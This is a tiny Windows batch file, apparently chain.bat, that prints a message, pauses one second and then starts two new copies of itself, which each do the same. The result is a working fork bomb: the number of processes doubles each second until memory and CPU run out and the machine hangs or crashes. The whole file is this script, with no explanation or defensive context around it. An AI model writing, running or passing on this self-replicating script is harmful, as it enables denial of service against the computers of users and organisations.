@echo off
echo Running script instance...
timeout /t 1 >nul

REM Launch two new copies of this script
start "" cmd /c chain.bat
start "" cmd /c chain.bat
